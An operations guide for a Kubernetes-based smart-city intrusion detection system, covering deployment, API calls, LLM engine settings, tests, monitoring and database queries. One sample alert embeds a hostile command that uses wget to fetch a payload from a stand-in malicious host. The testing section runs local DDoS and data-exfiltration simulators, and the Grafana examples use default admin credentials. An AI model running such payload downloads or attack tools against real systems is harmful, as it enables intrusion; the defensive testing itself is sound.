# 🔧 Smart City IDS - Complete Operations Guide

This document covers all commands, testing procedures, and operational tasks for the Smart City IDS system.

---

## 📋 Table of Contents

1. [System Startup](#1-system-startup)
2. [Service Management](#2-service-management)
3. [API Commands](#3-api-commands)
4. [LLM Engine Operations](#4-llm-engine-operations)
5. [Testing Commands](#5-testing-commands)
6. [Monitoring Commands](#6-monitoring-commands)
7. [Troubleshooting Commands](#7-troubleshooting-commands)
8. [Database Operations](#8-database-operations)

---

## 1. System Startup

### Full System Deployment

```bash
# Deploy everything (K3s + all services)
cd /home/kali/smart-city-ids
sudo ./scripts/start-everything.sh

# Wait for all pods to be ready
kubectl get pods -n smart-city -w
kubectl get pods -n monitoring -w
kubectl get pods -n falco-system -w
```

### Start Port Forwards

```bash
# Kill existing port-forwards and start new ones
pkill -f "port-forward" 2>/dev/null
sleep 1

# Start port forwards
kubectl port-forward -n smart-city svc/ids-api-service 8000:8000 &>/dev/null &
kubectl port-forward -n monitoring svc/grafana 3000:3000 &>/dev/null &
kubectl port-forward -n monitoring svc/prometheus 9090:9090 &>/dev/null &

sleep 3
echo "Port forwards ready"
```

### Verify System Health

```bash
# Check all namespaces
kubectl get pods -A

# Check specific services
curl -s http://localhost:8000/health | python3 -m json.tool
curl -s http://localhost:9090/-/healthy
curl -s http://localhost:3000/api/health
```

---

## 2. Service Management

### IDS API

```bash
# Check status
kubectl get pods -n smart-city -l app=ids-api

# View logs
kubectl logs -n smart-city -l app=ids-api --tail=100

# Restart
kubectl rollout restart deployment/ids-api -n smart-city

# Scale
kubectl scale deployment/ids-api -n smart-city --replicas=3
```

### Falco Forwarder

```bash
# Check status
kubectl get pods -n monitoring -l app=falco-forwarder

# View logs
kubectl logs -n monitoring -l app=falco-forwarder --tail=50

# Restart
kubectl rollout restart deployment/falco-forwarder -n monitoring
```

### Suricata Forwarder

```bash
# Check status
kubectl get pods -n monitoring -l app=suricata-forwarder

# View logs
kubectl logs -n monitoring -l app=suricata-forwarder --tail=50

# Restart
kubectl rollout restart deployment/suricata-forwarder -n monitoring
```

### PostgreSQL

```bash
# Check status
kubectl get pods -n smart-city -l app=postgres

# Connect to database
kubectl exec -it -n smart-city $(kubectl get pods -n smart-city -l app=postgres -o jsonpath='{.items[0].metadata.name}') -- psql -U postgres -d smartcity_ids

# Check tables
kubectl exec -it -n smart-city $(kubectl get pods -n smart-city -l app=postgres -o jsonpath='{.items[0].metadata.name}') -- psql -U postgres -d smartcity_ids -c '\dt'
```

---

## 3. API Commands

### Health & Status

```bash
# Health check
curl -s http://localhost:8000/health | python3 -m json.tool

# Get metrics (JSON)
curl -s http://localhost:8000/api/metrics | python3 -m json.tool

# Get Prometheus metrics
curl -s http://localhost:8000/metrics | head -50
```

### Alert Management

```bash
# Get recent alerts
curl -s http://localhost:8000/api/alerts | python3 -m json.tool

# Get alerts by source
curl -s "http://localhost:8000/api/alerts?source=falco" | python3 -m json.tool

# Submit test alert
curl -X POST http://localhost:8000/api/alerts \
  -H "Content-Type: application/json" \
  -d '{
    "output": "Test alert for demonstration",
    "priority": "Warning",
    "rule": "Test Rule",
    "time": "'$(date -Iseconds)'",
    "output_fields": {
      "container.name": "test-container",
      "proc.cmdline": "test-process"
    }
  }'

# Submit critical alert
curl -X POST http://localhost:8000/api/alerts \
  -H "Content-Type: application/json" \
  -d '{
    "output": "Critical security breach detected",
    "priority": "Critical",
    "rule": "Unauthorized Process Execution",
    "time": "'$(date -Iseconds)'",
    "output_fields": {
      "container.name": "traffic-camera-001",
      "proc.cmdline": "/bin/bash -c wget http://malicious.site/payload"
    }
  }'
```

### Circuit Breaker

```bash
# Get circuit breaker status
curl -s http://localhost:8000/api/circuit-breaker/status | python3 -m json.tool

# Reset all circuit breakers
curl -s -X POST http://localhost:8000/api/circuit-breaker/reset | python3 -m json.tool
```

### Rate Limiter

```bash
# Get rate limiter stats
curl -s http://localhost:8000/api/rate-limiter/stats | python3 -m json.tool

# Reset rate limiter stats
curl -s -X POST http://localhost:8000/api/rate-limiter/reset | python3 -m json.tool
```

### Operator Dashboard

```bash
# Get dashboard data
curl -s http://localhost:8000/api/operator/dashboard | python3 -m json.tool

# Search incidents
curl -s "http://localhost:8000/api/operator/incidents?severity_min=7" | python3 -m json.tool

# Get governance mode
curl -s http://localhost:8000/api/governance/mode | python3 -m json.tool

# Set governance mode
curl -s -X POST http://localhost:8000/api/governance/mode \
  -H "Content-Type: application/json" \
  -d '{"mode": "assisted"}'
```

---

## 4. LLM Engine Operations

### Check Available Engines

```bash
# Get LLM status from metrics
curl -s http://localhost:8000/api/metrics | python3 -c "
import sys, json
data = json.load(sys.stdin)
print('LLM Engines:')
for engine, stats in data.get('llm_engines', {}).items():
    print(f'  {engine}: {stats}')
"
```

### Set LLM Priority

```bash
# Set environment variable (before starting)
export LLM_PRIORITY="gemini,xai,openai,anthropic,kimi"

# Or update Kubernetes secret
kubectl edit secret ids-secrets -n smart-city
```

### Test Specific Engine

```bash
# Force use specific engine (if supported by API)
curl -X POST http://localhost:8000/api/alerts \
  -H "Content-Type: application/json" \
  -H "X-LLM-Engine: gemini" \
  -d '{"output": "Test", "priority": "Low", "rule": "Test"}'
```

### Monitor LLM Performance

```bash
# Check LLM latency
curl -s http://localhost:8000/metrics | grep llm_latency

# Check LLM request counts
curl -s http://localhost:8000/metrics | grep llm_requests

# Check circuit breaker states
curl -s http://localhost:8000/metrics | grep circuit_breaker
```

---

## 5. Testing Commands

### Unit Tests

```bash
cd /home/kali/smart-city-ids

# Install test dependencies
pip install pytest pytest-cov pytest-asyncio

# Run all tests
pytest tests/ -v

# Run specific test file
pytest tests/test_llm_engine.py -v

# Run with coverage
pytest tests/ --cov=services/ids-api/src --cov-report=html

# Run only fast tests
pytest tests/ -v -m "not slow"
```

### Integration Tests

```bash
# Test alert flow
python3 -c "
import requests
import json

# Submit alert
resp = requests.post('http://localhost:8000/api/alerts', json={
    'output': 'Integration test alert',
    'priority': 'Warning',
    'rule': 'Integration Test',
    'time': '2025-02-05T10:00:00Z',
    'output_fields': {'container.name': 'test'}
})
print('Submit:', resp.status_code)
print(json.dumps(resp.json(), indent=2))
"
```

### Load Testing

```bash
# Simple load test
for i in {1..100}; do
  curl -s -X POST http://localhost:8000/api/alerts \
    -H "Content-Type: application/json" \
    -d '{"output": "Load test '$i'", "priority": "Low", "rule": "Load Test"}' &
done
wait
echo "Sent 100 alerts"

# Check processing
curl -s http://localhost:8000/api/metrics | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f'Total alerts: {d.get(\"total_alerts\", 0)}')
"
```

### Attack Simulation

```bash
# DDoS simulation
cd attack-simulator
python ddos_simulator.py http://localhost:30100 10 30

# Phase 4 attacks
python phase4-smart-city-attacks.py

# Data exfiltration test
python data_exfiltration.py
```

---

## 6. Monitoring Commands

### Prometheus Queries

```bash
# Total alerts received
curl -s "http://localhost:9090/api/v1/query?query=smartcity_ids_alerts_received_total" | python3 -m json.tool

# Alert rate (per minute)
curl -s "http://localhost:9090/api/v1/query?query=rate(smartcity_ids_alerts_received_total[5m])*60" | python3 -m json.tool

# Severity distribution
curl -s "http://localhost:9090/api/v1/query?query=smartcity_ids_severity_total" | python3 -m json.tool

# LLM latency
curl -s "http://localhost:9090/api/v1/query?query=smartcity_ids_llm_latency_seconds" | python3 -m json.tool

# Circuit breaker states
curl -s "http://localhost:9090/api/v1/query?query=smartcity_ids_circuit_breaker_state" | python3 -m json.tool
```

### Grafana

```bash
# Check Grafana health
curl -s http://localhost:3000/api/health

# List dashboards
curl -s -u admin:admin http://localhost:3000/api/search | python3 -m json.tool

# Get specific dashboard
curl -s -u admin:admin http://localhost:3000/api/dashboards/uid/smart-city-ids | python3 -m json.tool
```

### Live Monitoring

```bash
# Watch alerts in real-time
watch -n 2 'curl -s http://localhost:8000/api/metrics | python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"Alerts: {d.get(\"total_alerts\",0)}, Critical: {d.get(\"critical_alerts\",0)}\")"'

# Watch pod status
watch kubectl get pods -n smart-city

# Watch events
kubectl get events -n smart-city -w
```

---

## 7. Troubleshooting Commands

### Check System State

```bash
# All pods status
kubectl get pods -A | grep -v Running

# Check for crashes
kubectl get pods -A | grep -E "Error|CrashLoop|Pending"

# Get events
kubectl get events -A --sort-by='.lastTimestamp' | tail -20
```

### Debug IDS API

```bash
# Detailed logs
kubectl logs -n smart-city -l app=ids-api --tail=200 -f

# Exec into pod
kubectl exec -it -n smart-city $(kubectl get pods -n smart-city -l app=ids-api -o jsonpath='{.items[0].metadata.name}') -- /bin/bash

# Check environment
kubectl exec -n smart-city $(kubectl get pods -n smart-city -l app=ids-api -o jsonpath='{.items[0].metadata.name}') -- env | grep -E "API_KEY|LLM|DB"
```

### Fix Common Issues

```bash
# Reset K3s permissions
sudo chmod 644 /etc/rancher/k3s/k3s.yaml
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml

# Restart K3s
sudo systemctl restart k3s
sleep 15

# Clear stuck pods
kubectl delete pods -n smart-city --field-selector=status.phase=Failed
kubectl delete pods -n smart-city --field-selector=status.phase=Pending --force

# Restart all deployments
kubectl rollout restart deployment -n smart-city
kubectl rollout restart deployment -n monitoring
```

### Network Debug

```bash
# Check services
kubectl get svc -A

# Test service connectivity
kubectl run test-curl --rm -it --image=curlimages/curl -- curl -s http://ids-api-service.smart-city.svc.cluster.local:8000/health

# Check endpoints
kubectl get endpoints -n smart-city
```

---

## 8. Database Operations

### Connect to PostgreSQL

```bash
# Get pod name
PG_POD=$(kubectl get pods -n smart-city -l app=postgres -o jsonpath='{.items[0].metadata.name}')

# Connect
kubectl exec -it -n smart-city $PG_POD -- psql -U postgres -d smartcity_ids
```

### Database Queries

```sql
-- Count alerts
SELECT COUNT(*) FROM alerts;

-- Alerts by source
SELECT source, COUNT(*) FROM alerts GROUP BY source;

-- Severity distribution
SELECT severity, COUNT(*) FROM alerts WHERE severity IS NOT NULL GROUP BY severity ORDER BY severity;

-- Recent alerts
SELECT id, source, rule, severity, created_at FROM alerts ORDER BY id DESC LIMIT 10;

-- Throttled alerts
SELECT COUNT(*) FROM throttled_alerts;
SELECT throttle_reason, COUNT(*) FROM throttled_alerts GROUP BY throttle_reason;

-- Automation actions
SELECT action_type, status, COUNT(*) FROM automation_actions GROUP BY action_type, status;

-- System logs
SELECT level, component, message FROM system_logs ORDER BY created_at DESC LIMIT 20;
```

### Backup & Restore

```bash
# Backup
kubectl exec -n smart-city $PG_POD -- pg_dump -U postgres smartcity_ids > backup_$(date +%Y%m%d).sql

# Restore
kubectl exec -i -n smart-city $PG_POD -- psql -U postgres smartcity_ids < backup.sql
```

---

## 📝 Quick Reference Card

| Task | Command |
|------|---------|
| Start everything | `sudo ./scripts/start-everything.sh` |
| Check health | `curl http://localhost:8000/health` |
| Get metrics | `curl http://localhost:8000/api/metrics` |
| Reset circuit breakers | `curl -X POST http://localhost:8000/api/circuit-breaker/reset` |
| View logs | `kubectl logs -n smart-city -l app=ids-api --tail=100` |
| Restart IDS | `kubectl rollout restart deployment/ids-api -n smart-city` |
| Run tests | `pytest tests/ -v` |
| Watch pods | `watch kubectl get pods -n smart-city` |

---

**Last Updated:** February 2026
